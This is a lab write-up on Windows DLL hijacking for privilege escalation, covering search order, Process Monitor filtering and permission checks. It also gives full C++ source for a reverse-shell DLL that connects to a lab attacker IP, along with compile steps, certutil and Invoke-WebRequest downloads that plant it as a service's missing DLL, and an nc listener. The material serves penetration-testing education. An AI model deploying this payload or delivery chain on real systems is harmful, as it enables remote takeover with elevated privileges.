<h1 align="center"> Windows DLL Hijacking </h1>


<img width="1024" height="550" alt="Windows DLL Hijacking" src="https://github.com/user-attachments/assets/aebdb743-eb0c-4830-828d-21067c703cca" />


## Scope:
- **Attacker**: Kali Linux (IP `192.168.127.128`)
- **Victim**: Windows 10 (IP `192.168.127.148`)

---

## Table of Contents
[INTRODUCTION TO WINDOWS DLL HIJACKING](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#introduction-to-windows-dll-hijacking)

  - [What is DLL Hijacking?](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#what-is-dll-hijacking)
  - [DLL Hijacking Process](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#dll-hijacking-process)

[SETUP LAB](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#setup-lab)

  - [Setup VScode](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#1-setup-vscode)
  - [Setup C/C++](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#2-setup-cc)

[WINDOWS DLL HIJACKING METHODOLOGY](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#windows-dll-hijacking-methodology)
  1. [BASIC COMMANDS & MANUAL TESTING](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#1-basic-commands--manual-testing)
     1. [Basic Directory Navigation](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#1-basic-directory-navigation)
     2. [Check Basic File Permissions](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#2-check-basic-file-permissions)
     3. [Simple DLL Test](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#3-simple-dll-test)
    
  2. [Finding Vulnerable Applications](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#2-finding-vulnerable-applications)
     1. [Manual Search for Missing DLLs](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#1-manual-search-for-missing-dlls)
     2. [Using Process Monitor](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#2-using-process-monitor)
     3. [Basic Powershell Commands](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#3-basic-powershell-commands)
    
  3. [CREATING MALICIOUS DLL](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#3-creating-malicious-dll)
     1. [Simple Message Box DLL (C++)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#1-simple-message-box-dll-c)
     2. [Revshell_dll.cpp](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/11.%20DLL_Hijacking.md#2-revshell_dllcpp)




---


# INTRODUCTION TO WINDOWS DLL HIJACKING 


## What is DLL Hijacking?
- **DLL (Dynamic Link Library) Hijacking**: Is a technique where an attacker tricks a legitimate Windows application into loading a malicious DLL (Dynamic Link Library) instead of the legitimate one it's supposed to load. This allows attackers to run their code with the same privileges as the vulnerable application.

- **DLL hijacking** exploits how Windows searches for these DLLs. If an application requests a DLL without specifying its full path, Windows follows a search order â€” and attackers can abuse this.

- **DLL** Stand for **Dynamic Link Library**.


### Type of DLL Hijacking
| Type               | Description                                                          | Example                                                    |
| ------------------ | -------------------------------------------------------------------- | ---------------------------------------------------------- |
| Standard Hijacking | Application loads a missing DLL from its own directory               | `C:\App\app.exe` loads `C:\App\missing.dll`                |
| PATH Hijacking     | Application loads a DLL from a writable directory in the system PATH | PATH includes `C:\Temp`, app loads `evil.dll` from there   |
| KnownDLLs Bypass   | Rare technique exploiting DLLs not protected by KnownDLLs            | Avoids loading from `C:\Windows\System32`                  |
| Remote DLL Loading | Application loads a DLL from a network (SMB) share                   | `\\attacker\share\payload.dll` (requires UNC path support) |



## How DLL Hijacking Work
Hereâ€™s the typical attack flow:
1. **Target application** requests a DLL (e.g., `example.dll`) without a full path.
2. **Windows searches** for ``example.dll`` in a specific order:
- Current working directory
- Application directory
- System directories
- Environment paths
3. **Attacker places a malicious DLL** named `example.dll` in a directory that gets searched first.
4. **Windows loads the attackerâ€™s DLL**, executing their code â€” often with the same privileges as the application.

If the app runs as LocalSystem, the attackerâ€™s code runs with SYSTEM privileges.



## DLL Hijacking Process

### 1. Understanding DLL Search Order
When a program needs a DLL, Windows searches in this order:
- **The directory from which the application loaded**
- **System directory** (`C:\Windows\System32`)
- **16-bit System directory** (`C:\Windows\System`)
- **Windows directory** (`C:\Windows`)
- **Current working directory**
- **Directories listed in the PATH environment variable**.

> The application's own directory is checked BEFORE system directories!


### 2. Identifying Vulnerable Applications
Look for applications that:
- **Run with elevated privileges** (as `Administrator` or `SYSTEM`)
- Try to load DLLs from unsafe locations
- Use DLLs that don't exist in **System32**.

- Tools to find vulnerable applications:
  - **Process Monitor** (ProcMon) - Free from Microsoft
  - **Process Explorer** - Part of Sysinternals Suite

### 3. Using Process Monitor to Find Vulnerabilities
- Download and run Process Monitor
- Set filters:
  - Process Name â†’ is â†’ [target_application.exe]
  - Path â†’ ends with â†’ .dll
  - Result â†’ is â†’ NAME NOT FOUND
- Run the target application
- Look for **DLLs that are NOT FOUND** in the application's directory

Example Filter in ProcMon:
````
Process Name: vulnerable_app.exe
Path: *.dll
Result: NAME NOT FOUND
Operation: CreateFile
````

---



# SETUP LAB


## 1. Setup VScode
- In this first I need to Install **Visual Studio Community Edition** or Visual Studio Build Tools. During setup, include the C++ development tools.

- But in this I want to transfer from my **Windows 11** on my local machine:
<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/729a09f2-1570-4721-a8f0-5b1507501fe1" />

##### After setup it:
- Pess `Double-Click` on it:
<img width="592" height="457" alt="image" src="https://github.com/user-attachments/assets/5016e74a-ebe9-4687-a5ae-9790bfb10710" />

<img width="597" height="466" alt="image" src="https://github.com/user-attachments/assets/763226a2-c409-4839-b8b7-104c58d0227c" />

<img width="595" height="457" alt="image" src="https://github.com/user-attachments/assets/a40265c3-f5f7-4965-a7c0-5721b5a9aed7" />

<img width="592" height="461" alt="image" src="https://github.com/user-attachments/assets/0a9eba2d-d65d-4155-95bf-f11e72977fae" />

<img width="595" height="458" alt="image" src="https://github.com/user-attachments/assets/0737bc16-13fd-4452-83be-6946365ace8a" />

- After wait it a few minute it will finished.
<img width="597" height="463" alt="image" src="https://github.com/user-attachments/assets/be6c808b-baf8-4dfe-a390-0f58f326f4a3" />

- After I install some extension:
<img width="1195" height="798" alt="image" src="https://github.com/user-attachments/assets/b7e97f5e-cb5b-41f9-8975-d754c91d8aec" />

<img width="1201" height="797" alt="image" src="https://github.com/user-attachments/assets/65d86acd-67b0-4fe2-83dd-57c939c40feb" />



## 2. Setup C/C++

Download **MiGW-w64**:
- Go to: https://sourceforge.net/projects/mingw-w64/ 
- Click Download to get the installer (`mingw-w64-install.exe`).

- After I downloaded it:
<img width="1008" height="942" alt="image" src="https://github.com/user-attachments/assets/74199633-42ec-409d-8e5b-165cb9fbb0f4" />

- Doubles-Click` on it -> `Next`:
<img width="640" height="390" alt="image" src="https://github.com/user-attachments/assets/d5fe4298-a64b-457c-883e-9617e3013977" />

<img width="642" height="388" alt="image" src="https://github.com/user-attachments/assets/40c875a0-95f0-4f3d-ac35-68cec757e708" />

<img width="638" height="391" alt="image" src="https://github.com/user-attachments/assets/30a73b82-908f-40db-bacd-0d63ec34272e" />

- After it will start install:
<img width="641" height="392" alt="image" src="https://github.com/user-attachments/assets/aa14cd75-6fb4-48ea-bc1f-56987f8ca559" />

- After we wait it a few minutes, and now it finished:
<img width="641" height="390" alt="image" src="https://github.com/user-attachments/assets/20133c3d-26cc-440b-a882-38a744c120c5" />

- After type this command:
````
pacman -S mingw-w64-ucrt-x86_64-gcc
````
<img width="1903" height="765" alt="image" src="https://github.com/user-attachments/assets/63a7b3d0-118c-4635-8a65-1bfb5fbb327a" />


- Now it finished install, After Verify it:
````
x86_64-w64-mingw32-gcc --version
````
<img width="563" height="167" alt="image" src="https://github.com/user-attachments/assets/73131155-1c1e-4c6b-9bd0-1d43d4aee4f0" />

- Now we see the GCC version is `15.1.0`.

- Now we succeed to install and Setup MinGW.
 




---


# WINDOWS DLL HIJACKING METHODOLOGY

## 1. BASIC COMMANDS & MANUAL TESTING
First open our command promt
Open our ``CMD`` -> First Press `Ctrl S` -> type `cmd` or `command prompt` -> `Right-Click` -> select `Run as administrator`:
<img width="783" height="680" alt="image" src="https://github.com/user-attachments/assets/4daab5c4-0d89-4823-be90-b04b57530c23" />



### 1. Basic Directory Navigation


#### Check
````
cd
cd C:\
dir
````
<img width="555" height="501" alt="image" src="https://github.com/user-attachments/assets/725a812a-d8d0-472e-b0f6-30a1b55cd69e" />

- `dir`: List files in current directory.
- `cd C:\`: Change to C drive.
- `cd`: See where we are.



#### List files with details
````
dir /w
````
<img width="1293" height="217" alt="image" src="https://github.com/user-attachments/assets/be0b834f-c45a-42c0-af8d-cae904add6ca" />


````
dir /p  
````
<img width="561" height="412" alt="image" src="https://github.com/user-attachments/assets/2e5c01cf-b544-499d-ae11-b059a19cd660" />

- page by page


#### Create a directory
````
mkdir test_folder
dir test_folder
````
<img width="617" height="341" alt="image" src="https://github.com/user-attachments/assets/1f4111c1-e40c-489c-bcea-5650233ae5d1" />



#### Go into directory
````
cd test_folder
````
<img width="231" height="114" alt="image" src="https://github.com/user-attachments/assets/013426c1-3f85-4b98-b7b1-321d86caa8c3" />


#### Go back one level
````
cd ..
````
<img width="201" height="110" alt="image" src="https://github.com/user-attachments/assets/55567a33-3f99-42eb-80d0-40180e978e08" />


#### Go to specific path
````
cd "C:\Program Files"
````
<img width="750" height="686" alt="image" src="https://github.com/user-attachments/assets/a5802321-5fb0-4123-af82-e1c66ea47bfe" />



### 2. Check Basic File Permissions

#### See who can access a folder
````
icacls "C:\Program Files"
````
<img width="867" height="333" alt="image" src="https://github.com/user-attachments/assets/7699a53b-1302-43fc-a88b-b31296698bd0" />


#### Check specific file
````
icacls "C:\Windows\System32\kernel32.dll"
````
<img width="908" height="196" alt="image" src="https://github.com/user-attachments/assets/a8e1fbbb-eaec-470f-b3fa-a8aaa65c81b6" />

Each line shows which account/group has what rights:

- `NT SERVICE\TrustedInstaller:(F)`: The TrustedInstaller service has Full control (F). This is normal â€” TrustedInstaller manages system files.
- `BUILTIN\Administrators:(RX)`: Administrators can Read & Execute (RX), but not modify.
- `NT AUTHORITY\SYSTEM:(RX)`: The SYSTEM account can also only Read & Execute.
- `BUILTIN\Users:(RX)`: Regular users can only Read & Execute.
- `APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)`: Universal Windows apps can read/execute it.
- `APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APP PACKAGES:(RX)`: Restricted app containers can also read/execute.





### 3. Simple DLL Test

#### Create a simple text file named test.dll
````
echo "test" > test.dll
dir test.dll
type test.dll
````
<img width="567" height="385" alt="image" src="https://github.com/user-attachments/assets/5fcc0d54-fa59-4299-935d-16991b1c69a1" />



#### Copy it to different locations
````
copy test.dll "C:\test.dll"
````
<img width="497" height="261" alt="image" src="https://github.com/user-attachments/assets/2a43a892-5b0b-44e6-8d47-9a9562e7d4f3" />

````
copy C:\test.dll "C:\Program Files\test.dll"
````
<img width="637" height="150" alt="image" src="https://github.com/user-attachments/assets/1ecaefd1-db2e-4ce4-a75a-0cab1eea9e0b" />


#### Check if it exists
````
dir "C:\test.dll"
````
<img width="527" height="212" alt="image" src="https://github.com/user-attachments/assets/fe0a0940-a4e3-4785-837f-57ca9e609126" />


---



## 2. Finding Vulnerable Applications

### 1. Manual Search for Missing DLLs

#### Look for applications in Program Files
````
dir "C:\Program Files\" /s /b *.exe
````
<img width="720" height="850" alt="image" src="https://github.com/user-attachments/assets/bf0ce469-4f0f-4f4f-81a0-2edf36a26c7d" />

- `dir`: Lists files and directories.
- `"C:\Program Files\"`: The starting folder youâ€™re searching in.
- `/s`: Search subdirectories recursively (goes into every folder under `C:\Program Files`).
- `/b`: Use bare format (just the full path, no extra details like size/date).
- `*.exe`: Filter results to only show files ending with `.exe` (executables).
- This command is used to **list every** `.exe` file under `C:\Program Files` recursively, showing their full paths in a clean format.



#### Look for applications in Program Files (x86)
````
dir "C:\Program Files (x86)\" /s /b *.exe
````
<img width="815" height="853" alt="image" src="https://github.com/user-attachments/assets/7e9427e4-adfb-44dd-9fa4-461c86f12127" />

- `"C:\Program Files (x86)\"`: Starting folder (Program Files for 32â€‘bit apps).
- This command is used to list every `.exe` file under `C:\Program Files (x86)` recursively, showing their full paths. If youâ€™re seeing folders or `.dll` files, it means the filter wasnâ€™t applied correctly â€” reâ€‘run with `*.exe` to get the intended results.


---


### 2. Using Process Monitor 

- Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
<img width="1918" height="893" alt="image" src="https://github.com/user-attachments/assets/339259df-c47b-43c2-a093-67fe1ebcb66a" />

- Extract to `C:\Tools\ProcMon`:
<img width="1310" height="778" alt="image" src="https://github.com/user-attachments/assets/df5e0a0f-097f-4fbb-a56a-4cc7f6e3e330" />

<img width="617" height="452" alt="image" src="https://github.com/user-attachments/assets/158e9bf9-d986-4e83-a605-cb94e1edef41" />

<img width="709" height="644" alt="image" src="https://github.com/user-attachments/assets/8a82ebb4-2769-4ae6-b57a-399fa88a17fd" />

- Now we see it, after find it:
<img width="701" height="370" alt="image" src="https://github.com/user-attachments/assets/1555f157-dbaa-4c71-90a2-78efc6641bcd" />

<img width="848" height="412" alt="image" src="https://github.com/user-attachments/assets/01e7aebc-20ee-4b8b-85f3-4d711c7f7258" />

<img width="995" height="377" alt="image" src="https://github.com/user-attachments/assets/5e7e4b71-888e-48b7-8054-52046d2f7423" />

- After run it as `Run as administrator`:
<img width="1127" height="502" alt="image" src="https://github.com/user-attachments/assets/0efe3d82-e556-4b16-a3a2-415bd599c0f2" />

<img width="471" height="325" alt="image" src="https://github.com/user-attachments/assets/71b93f66-9000-447a-848f-d47663cac407" />

<img width="1117" height="894" alt="image" src="https://github.com/user-attachments/assets/714050bf-a4b2-419a-994e-fb7662d07e2c" />

- Now we see all.



#### Confirm a DLL searchâ€‘order issue with ProcMon
-  Click `File` -> `Capture Events` to stop current capture:
<img width="888" height="890" alt="image" src="https://github.com/user-attachments/assets/9c7ecf3c-14a4-4878-963e-594b566942b4" />

- Click `Filter` -> `Filter...`:
<img width="852" height="901" alt="image" src="https://github.com/user-attachments/assets/c362198a-c8b5-47a3-a5cb-cade4054086b" />

<img width="808" height="638" alt="image" src="https://github.com/user-attachments/assets/10931f7a-4e8f-4405-b02a-27c7cbb31263" />

<img width="1362" height="696" alt="image" src="https://github.com/user-attachments/assets/6e63c73f-203e-4465-aefa-766b77571ea5" />

- Now after I clicked Apply, and ProcMon is now showing only events that match this condition.

- After click `Ok`:
<img width="1367" height="697" alt="image" src="https://github.com/user-attachments/assets/e2f7e072-68af-4059-8e08-f7a4540c187c" />

- Start capture (Ctrl+E)
<img width="704" height="264" alt="image" src="https://github.com/user-attachments/assets/74a889cb-61bb-4364-a343-1e9647454319" />

- Process Monitor only shows events that happen AFTER you apply the filter, unless youâ€™ve already captured them.
  - But:
    - The process that loads test_pro.dll hasnâ€™t run yet
    - Or it ran before you applied the filter
      - Youâ€™ll see `nothing`.

- But if we see, we will see this:
  - **Operation** is `CreateFile`
  - **Path ends with** `.dll`
  - **Result** `is NAME NOT FOUND`


#### After I **Restart** the Service (If Itâ€™s a Service)

- But we need to open netcat port on attacker first:
````
nc -lvnp 4444
````
<img width="333" height="153" alt="image" src="https://github.com/user-attachments/assets/45d62227-e121-4e78-ad9d-620354af5666" />


- After on Victim:
````
sc start VulnService
````
<img width="418" height="136" alt="image" src="https://github.com/user-attachments/assets/7355a07b-7b00-4bc6-b2ce-67dda52b81c6" />

- After back to our attacker:
<img width="738" height="232" alt="image" src="https://github.com/user-attachments/assets/01624303-b110-49d2-85de-1b275e9d96c8" />

- Now we got target `shell`.

---


### 3. Basic Powershell Commands

#### Open PowerShell as Administrator
#### Check if PowerShell runs as admin
````
whoami /groups | findstr "S-1-16-12288"
````
<img width="856" height="74" alt="image" src="https://github.com/user-attachments/assets/3579c170-8ad9-40a1-a9db-697e8227b090" />

- `whoami /groups`: lists all the security groups and integrity levels your current process belongs to.
- `findstr "S-1-16-12288"`: filters for the specific SID (Security Identifier) that represents **High Mandatory Level**.

##### What â€œHigh Mandatory Levelâ€ means
Windows uses Mandatory Integrity Control (MIC) to enforce security boundaries:
- `Low`: Internet Explorer Protected Mode, sandboxed apps.
- `Medium`: Standard user processes (default for most apps).
- `High`: Elevated processes (run as Administrator).
- `System`: Services running as LocalSystem.

- Our output shows youâ€™re running in **High integrity mode**, meaning elevated Administrator privileges. If a DLL hijack succeeds here, the malicious DLL would execute with full admin rights.

> Note: This we use this command on cmd.


#### List running processes
````
Get-Process
````
<img width="1367" height="810" alt="image" src="https://github.com/user-attachments/assets/4bc16717-afe3-4172-a174-d143d2ffc369" />

- `Handles`: Number of open handles (files, registry keys, etc.) the process is using.
- `NPM(K)`: Non-paged memory (kernel memory) in KB.
- `PM(K)`: Paged memory (user-mode memory) in KB.
- `WS(K)`: Working set (physical RAM currently used).
- `CPU(s)`: Total CPU time consumed by the process.
- `Id`: Process ID (PID).
- `SI`: Session ID (0 = system session, 1 = interactive user session).
- `ProcessName`: Name of the executable.



#### Find all executables in a directory
````
Get-ChildItem -Path "C:\Program Files" -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue
````
<img width="1287" height="715" alt="image" src="https://github.com/user-attachments/assets/3bf27d11-158a-416b-909e-60984059f4dd" />

- `Get-ChildItem`: Lists files and folders (like dir in CMD).
- `-Path "C:\Program Files"`: Starting folder.
- `-Recurse`: Searches all subfolders.
- `-Filter "*.exe"`: Only returns files ending in .exe.
- `-ErrorAction SilentlyContinue`: Suppresses access-denied errors (common in Program Files).

- Our command gave you a full inventory of executables in Program Files. 



---


## 3. CREATING MALICIOUS DLL


### 1. Simple Message Box DLL (C++)
- In this I use it on attacker and transfer to victim:


#### Create file:
This I go to my folder `privesc`:
````
mousepad malicious.cpp
````
````
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) 
{
    switch (fdwReason) 
    {
        case DLL_PROCESS_ATTACH:
            // This runs when DLL is loaded
            MessageBox(NULL, TEXT("DLL Hijacked!"), TEXT("Success"), MB_OK);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
````
<img width="794" height="719" alt="image" src="https://github.com/user-attachments/assets/de6d5b9b-d718-41f8-872c-1f12bc7a95d3" />


#### Compile with MinGW (64-bit)
````
x86_64-w64-mingw32-g++ -shared -o malicious.dll malicious.cpp -luser32
ls -la *malicious*
````
<img width="828" height="159" alt="image" src="https://github.com/user-attachments/assets/46b890e5-1709-4175-bb4e-59e085f721dd" />


#### Transfer to victim:

#### On attacker
````
sudo python3 -m http.server 80
````
<img width="580" height="173" alt="image" src="https://github.com/user-attachments/assets/1cffb2d3-f499-4064-aff2-d25572a808c3" />


##### On victim
````
certutil -urlcache -f http://192.168.127.128/malicious.dll C:\Users\k4n0ng\Helo\malicious.dll
ls C:\Users\k4n0ng\Helo\malicious.dll
````
<img width="1328" height="319" alt="image" src="https://github.com/user-attachments/assets/e8339f4e-9ade-495b-ae5d-8a2fe5305cc4" />

> Note: 192.168.127.128 is my atacker IP.


#### Use rundll32.exe
````
rundll32.exe C:\Users\k4n0ng\Helo\malicious.dll,DllMain
````
<img width="964" height="301" alt="image" src="https://github.com/user-attachments/assets/447a683c-6c34-40b0-ae2d-7b5e89bd91fa" />

- Now we got success.

---


### 2. Revshell_dll.cpp

#### Create the C++ file
````
cd ~/privesc
mousepad revshell_dll.cpp
````
````
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")

void revshell() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in sa;
    
    WSAStartup(MAKEWORD(2,2), &wsa);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("192.168.127.128"); // ðŸ‘ˆ YOUR KALI IP
    sa.sin_port = htons(4444);
    
    if (WSAConnect(s, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL) == 0) {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }
}

// Exported function for testing (optional)
extern "C" __declspec(dllexport) void EntryPoint() {
    revshell();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        revshell();
    }
    return TRUE;
}
````
<img width="791" height="797" alt="image" src="https://github.com/user-attachments/assets/8a5f0fe2-e9df-461a-8440-8672fe78a8af" />



#### Compile the DLL
````
x86_64-w64-mingw32-g++ -shared -o revshell.dll revshell_dll.cpp -lws2_32 -s -w
ls -la *Revshell_dll*
````
<img width="900" height="161" alt="image" src="https://github.com/user-attachments/assets/c0d3618d-f4a9-4f49-bfde-b2784722b97a" />


````
nc -lvnp 4444
````
<img width="349" height="144" alt="image" src="https://github.com/user-attachments/assets/352af9f5-17ea-4446-8450-067d997c3794" />


#### On target (Windows):
````
cd C:\Users\k4n0ng
.\winPEASany.exe quiet dllhijacking
````
<img width="1900" height="782" alt="image" src="https://github.com/user-attachments/assets/f635c243-349b-46b6-aeaa-518947fe9414" />

<img width="1903" height="840" alt="image" src="https://github.com/user-attachments/assets/61813620-ff99-40e3-90df-4ddab0ca1499" />

<img width="1904" height="838" alt="image" src="https://github.com/user-attachments/assets/62296dea-3539-4afd-af73-0d10cce8359c" />

- We can view all.


#### Run full
````
winPEASany.exe
````
<img width="1895" height="828" alt="image" src="https://github.com/user-attachments/assets/d8c20fcf-a4a6-43c5-a6c0-9a6b236f99bd" />

<img width="1732" height="816" alt="image" src="https://github.com/user-attachments/assets/c3ac3ffd-f468-4a07-b992-7e61c4f996ec" />



#### Check C:\Windows\Tasks\
````
icacls "C:\Windows\Tasks"
````
<img width="563" height="206" alt="image" src="https://github.com/user-attachments/assets/72229b59-6a9d-44d5-9536-6c026cf353a6" />

- After back to our attack.

#### On attacker
````
sudo python3 -m http.server 80
````
<img width="661" height="172" alt="image" src="https://github.com/user-attachments/assets/4ea4d1c6-a427-41cd-b6ad-e3306ac8ba07" />


- On Victim:
````
certutil -urlcache -f http://192.168.127.128/revshell.dll "C:\ProgramData\VulnApp\missing.dll"
````
<img width="1019" height="163" alt="image" src="https://github.com/user-attachments/assets/7f112d9f-74b0-4701-8621-840c800a4f8c" />


- In this first I create a foder:
````
New-Item -ItemType Directory -Path "C:\ProgramData\VulnApp"
````
<img width="939" height="248" alt="image" src="https://github.com/user-attachments/assets/173e9827-f889-44f4-858a-b8d50055961e" />

````
Invoke-WebRequest -Uri http://192.168.127.128/revshell.dll -OutFile "C:\ProgramData\VulnApp\missing.dll"
````
<img width="1419" height="97" alt="image" src="https://github.com/user-attachments/assets/92d1de05-f1c4-450e-895e-01e9082fc05a" />

- Verify:
````
dir "C:\ProgramData\VulnApp\missing.dll"
````
<img width="1413" height="277" alt="image" src="https://github.com/user-attachments/assets/6976225a-29d2-4552-93b8-32f1d4e3447d" />



#### Trgger the service
````
sc stop VulnService
sc.exe start VulnService
````
<img width="512" height="141" alt="image" src="https://github.com/user-attachments/assets/3edc0977-56b1-48d4-9d6b-5e08fc799079" />


- On attacker:
<img width="712" height="219" alt="image" src="https://github.com/user-attachments/assets/26b56351-88d4-410a-9e65-a193d64e67f8" />

- Now we got target shell.
````
sc query type= service state= all | findstr /I "service"
````
<img width="838" height="773" alt="image" src="https://github.com/user-attachments/assets/2d38b072-00a7-465a-bd2e-845f0cc094aa" />

````
tasklist | findstr service
````
<img width="823" height="131" alt="image" src="https://github.com/user-attachments/assets/3f25efff-3919-4de6-aba7-88a175624066" />

-----

<h2 align="center"> Completed - Windows DLL Hijacking </h2>

<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
